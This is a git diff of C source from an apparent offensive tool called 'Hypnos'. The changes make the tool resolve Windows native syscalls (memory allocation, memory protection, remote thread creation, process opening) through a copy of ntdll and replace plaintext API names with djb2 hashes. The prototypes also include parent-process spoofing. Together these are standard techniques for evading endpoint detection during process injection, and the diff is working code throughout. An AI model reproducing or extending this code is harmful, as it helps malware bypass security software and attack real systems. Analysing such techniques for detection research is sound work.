@@ -1,10 +1,11 @@
-#include <malloc.h>
+#include <stdlib.h>
+
 #include "includes/sysgate.h"
 #include "includes/Native.h"
 
 // Function prototypes
 void Hypnos_GetImageExportDirectory(LPVOID imageBase, PIMAGE_EXPORT_DIRECTORY* ppNtdllExportDirectory);
-void* Hypnos_GetProcAddress(PVOID imageBase, LPCSTR toFind);
+void* Hypnos_GetProcAddress(PVOID imageBase, unsigned long toFind);
 WORD Hypnos_GetSyscallNumber(void* addr);
 DWORD FindProcess(const char* name);
 HANDLE SpoofProcessPPID(LPCSTR toSpawn, LPCSTR parentName);
@@ -14,23 +15,34 @@ void* getNtdllCopy();
 extern void PrepareSyscall(DWORD syscallNum);
 extern NTSTATUS InvokeSyscall();
 
+unsigned long djb2_hash(const char* str) {
+    unsigned long hash = 5381;
+    int c;
+
+    while ((c = *str++))
+        hash = ((hash << 5) + hash) + c; /* hash * 33 + c */
+
+    return hash;
+}
+
+
 PSYSCALL_TABLE InitSyscalls() {
     PSYSCALL_TABLE table = (PSYSCALL_TABLE)malloc(sizeof(SYSCALL_TABLE));
     LPVOID ntdllCopy = getNtdllCopy();
     
-    table->NtAllocateVirtualMemory.name = "NtAllocateVirtualMemory";
+    table->NtAllocateVirtualMemory.hash = 0x5bb3894b6793c34c;
     table->NtAllocateVirtualMemory.num = Hypnos_GetSyscallNumber(
-            Hypnos_GetProcAddress(ntdllCopy, "NtAllocateVirtualMemory"));
+            Hypnos_GetProcAddress(ntdllCopy, table->NtAllocateVirtualMemory.hash));
     
-    table->NtProtectVirtualMemory.name = "NtProtectVirtualMemory";
+    table->NtProtectVirtualMemory.hash = 0x80e0d54f082962c8;
     table->NtProtectVirtualMemory.num = Hypnos_GetSyscallNumber(
-            Hypnos_GetProcAddress(ntdllCopy, "NtProtectVirtualMemory"));
+            Hypnos_GetProcAddress(ntdllCopy, table->NtProtectVirtualMemory.hash));
     
-    table->NtCreateThreadEx.name = "NtCreateThreadEx";
-    table->NtCreateThreadEx.num = Hypnos_GetSyscallNumber(Hypnos_GetProcAddress(ntdllCopy, "NtCreateThreadEx"));
+    table->NtCreateThreadEx.hash = 0x8dcc6f8fcb0c2130;
+    table->NtCreateThreadEx.num = Hypnos_GetSyscallNumber(Hypnos_GetProcAddress(ntdllCopy, table->NtCreateThreadEx.hash));
     
-    table->ZwOpenProcess.name = "ZwOpenProcess";
-    table->ZwOpenProcess.num = Hypnos_GetSyscallNumber(Hypnos_GetProcAddress(ntdllCopy, "ZwOpenProcess"));
+    table->ZwOpenProcess.hash = 0xfe98fb589b524a87;
+    table->ZwOpenProcess.num = Hypnos_GetSyscallNumber(Hypnos_GetProcAddress(ntdllCopy, table->ZwOpenProcess.hash));
 
     return table;
 }
@@ -44,7 +56,7 @@ void Hypnos_GetImageExportDirectory(LPVOID imageBase, PIMAGE_EXPORT_DIRECTORY* p
     *ppNtdllExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)imageBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
 }
 
-void* Hypnos_GetProcAddress(PVOID imageBase, LPCSTR toFind) {
+void* Hypnos_GetProcAddress(PVOID imageBase, unsigned long toFind) {
 	PIMAGE_EXPORT_DIRECTORY pNtdllExportDirectory;
     Hypnos_GetImageExportDirectory(imageBase, &pNtdllExportDirectory);
 
@@ -58,7 +70,7 @@ void* Hypnos_GetProcAddress(PVOID imageBase, LPCSTR toFind) {
 		char* pFunctionName = (char*)((PBYTE)imageBase + pdwFunctionNames[i]);
 		void* pFunctionAddress = (PBYTE)imageBase + pdwFunctionAddresses[pwAddressOfNameOrdinals[i]]; 
 
-		if (strcmp(pFunctionName, toFind) == 0) return pFunctionAddress;
+		if (djb2_hash(pFunctionName) == toFind) return pFunctionAddress;
 	}
 
 	return NULL;
